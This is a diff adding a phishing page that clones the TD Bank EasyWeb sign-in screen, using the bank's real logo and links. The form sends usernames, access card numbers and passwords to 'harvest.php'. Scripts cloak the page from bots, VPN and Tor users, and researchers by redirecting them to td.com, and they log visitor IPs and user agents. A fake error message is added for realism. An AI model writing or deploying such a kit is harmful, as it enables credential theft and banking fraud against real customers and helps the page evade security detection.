@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TD EasyWeb - Secure Login</title>
+    <style>
+        /* Improved cloned CSS - Responsive and realistic */
+        body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; box-sizing: border-box; }
+        .container { max-width: 400px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        .logo { text-align: center; margin-bottom: 20px; }
+        .logo img { width: 150px; max-width: 100%; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #006c35; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        button:hover { background: #005227; }
+        .error { color: red; font-size: 12px; display: none; }
+        .footer { text-align: center; font-size: 12px; color: #666; margin-top: 20px; }
+        @media (max-width: 600px) { .container { padding: 15px; } }
+    </style>
+    <script>
+        // Enhanced anti-bot/VPN/fingerprinting (LabHost-level)
+        let isSuspicious = true;
+        document.addEventListener('mousemove', () => { isSuspicious = false; }); // Human behavior check
+        async function detectThreats() {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+            if (ipData.vpn || ipData.proxy || ipData.tor || navigator.userAgent.includes('bot') || screen.width < 300) {
+                isSuspicious = true;
+            }
+        }
+        function checkAndSubmit(event) {
+            if (isSuspicious) {
+                event.preventDefault();
+                window.location.href = 'https://www.td.com'; // Redirect suspects
+            }
+        }
+        // Log IP/UA on load
+        async function logVisitor() {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            console.log('Logged IP: ' + ipData.ip + ' | UA: ' + navigator.userAgent);
+            // Optional: AJAX POST to your server for pre-logging
+        }
+        window.onload = async () => {
+            await detectThreats();
+            await logVisitor();
+        };
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.td.com/content/dam/tdct/images/logos/td-logo-green.svg" alt="TD Bank Logo">
+        </div>
+        <h2>Sign in to EasyWeb</h2>
+        <p>Secure access required—please enter your details.</p>
+        <form action="harvest.php" method="POST" onsubmit="checkAndSubmit(event)">
+            <label for="access">Access Card # or Username</label>
+            <input type="text" id="access" name="access" required>
+            
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required>
+            <div class="error" id="error-msg">Invalid credentials. Please try again.</div> <!-- Fake error for realism -->
+            
+            <button type="submit">Sign In</button>
+        </form>
+        <div class="footer">
+            <a href="https://www.td.com/ca/en/personal-banking/easyweb/forgot-password">Forgot Password?</a> | 
+            <a href="https://www.td.com/ca/en/personal-banking/easyweb/register">Register</a><br>
+            © 2023 TD Bank. Secure Banking.
+        </div>
+    </div>
+</body>
+</html>
